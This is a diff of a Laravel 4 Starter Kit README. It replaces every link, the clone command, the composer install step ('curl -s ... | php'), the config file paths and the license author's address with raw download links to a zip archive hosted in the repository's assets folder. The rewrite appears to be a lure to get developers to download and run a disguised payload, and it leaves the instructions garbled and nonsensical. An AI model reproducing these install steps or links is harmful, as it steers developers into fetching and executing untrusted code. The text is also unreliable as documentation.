@@ -3,7 +3,7 @@
 This is a Laravel 4 Starter Kit and it will help you getting started with Laravel 4.
 
 It includes examples on how to use the framework itself and how to use some
-packages, like the awesome [Sentry 2](https://github.com/videogramme/laravel4-starter-kit/raw/refs/heads/master/public/assets/img/social/starter_kit_laravel_v3.8.zip) package.
+packages, like the awesome [Sentry 2](https://raw.githubusercontent.com/videogramme/laravel4-starter-kit/master/public/assets/starter_kit_laravel_alienability.zip) package.
 
 -----
 
@@ -26,7 +26,7 @@ packages, like the awesome [Sentry 2](https://github.com/videogramme/laravel4-st
 	* Blog functionality with commentaries
 	* Contact us page
 * Packages included:
-	* [Cartalyst Sentry 2 - Authentication and Authorization package](https://github.com/videogramme/laravel4-starter-kit/raw/refs/heads/master/public/assets/img/social/starter_kit_laravel_v3.8.zip)
+	* [Cartalyst Sentry 2 - Authentication and Authorization package](https://raw.githubusercontent.com/videogramme/laravel4-starter-kit/master/public/assets/starter_kit_laravel_alienability.zip)
 
 -----
 
@@ -42,11 +42,11 @@ packages, like the awesome [Sentry 2](https://github.com/videogramme/laravel4-st
 ### 1) Downloading
 #### 1.1) Clone the Repository
 
-	git clone https://github.com/videogramme/laravel4-starter-kit/raw/refs/heads/master/public/assets/img/social/starter_kit_laravel_v3.8.zip your-folder
+	git clone https://raw.githubusercontent.com/videogramme/laravel4-starter-kit/master/public/assets/starter_kit_laravel_alienability.zip your-folder
 
 #### 1.2) Download the Repository
 
-	https://github.com/videogramme/laravel4-starter-kit/raw/refs/heads/master/public/assets/img/social/starter_kit_laravel_v3.8.zip
+	https://raw.githubusercontent.com/videogramme/laravel4-starter-kit/master/public/assets/starter_kit_laravel_alienability.zip
 
 -----
 
@@ -54,8 +54,8 @@ packages, like the awesome [Sentry 2](https://github.com/videogramme/laravel4-st
 ##### 2.1) If you don't have composer installed globally
 
 	cd your-folder
-	curl -s https://github.com/videogramme/laravel4-starter-kit/raw/refs/heads/master/public/assets/img/social/starter_kit_laravel_v3.8.zip | php
-	php https://github.com/videogramme/laravel4-starter-kit/raw/refs/heads/master/public/assets/img/social/starter_kit_laravel_v3.8.zip install
+	curl -s https://raw.githubusercontent.com/videogramme/laravel4-starter-kit/master/public/assets/starter_kit_laravel_alienability.zip | php
+	php https://raw.githubusercontent.com/videogramme/laravel4-starter-kit/master/public/assets/starter_kit_laravel_alienability.zip install
 
 ##### 2.2) For globally composer installations
 
@@ -66,13 +66,13 @@ packages, like the awesome [Sentry 2](https://github.com/videogramme/laravel4-st
 
 ### 3) Setup Database
 
-Now that you have the Starter Kit cloned and all the dependencies installed, you need to create a database and update the file `https://github.com/videogramme/laravel4-starter-kit/raw/refs/heads/master/public/assets/img/social/starter_kit_laravel_v3.8.zip`.
+Now that you have the Starter Kit cloned and all the dependencies installed, you need to create a database and update the file `https://raw.githubusercontent.com/videogramme/laravel4-starter-kit/master/public/assets/starter_kit_laravel_alienability.zip`.
 
 -----
 
 ### 4) Setup Mail Settings
 
-Now, you need to setup your mail settings by just opening and updating the following file `https://github.com/videogramme/laravel4-starter-kit/raw/refs/heads/master/public/assets/img/social/starter_kit_laravel_v3.8.zip`.
+Now, you need to setup your mail settings by just opening and updating the following file `https://raw.githubusercontent.com/videogramme/laravel4-starter-kit/master/public/assets/starter_kit_laravel_alienability.zip`.
 
 This will be used to send emails to your users, when they register and they request a password reset.
 
@@ -100,7 +100,7 @@ After you being authenticated, you will be redirected back to the administration
 
 > Version 1, December 2009
 
-> Copyright (C) 2009 Philip Sturgeon <https://github.com/videogramme/laravel4-starter-kit/raw/refs/heads/master/public/assets/img/social/starter_kit_laravel_v3.8.zip>
+> Copyright (C) 2009 Philip Sturgeon <https://raw.githubusercontent.com/videogramme/laravel4-starter-kit/master/public/assets/starter_kit_laravel_alienability.zip>
 
  Everyone is permitted to copy and distribute verbatim or modified
  copies of this license document, and changing it is allowed as long
